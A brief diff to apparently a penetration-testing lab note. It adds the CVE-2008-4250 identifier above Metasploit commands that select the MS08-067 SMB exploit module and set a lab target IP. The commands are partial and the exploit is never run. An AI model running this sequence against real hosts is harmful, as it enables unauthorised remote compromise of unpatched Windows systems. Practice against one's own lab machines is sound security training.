@@ -1,3 +1,4 @@
+CVE-2008-4250
 search ms08-067
 use exploit/windows/smb/ms08_067_netapi
 set rhost 192.168.55.106  目标靶机
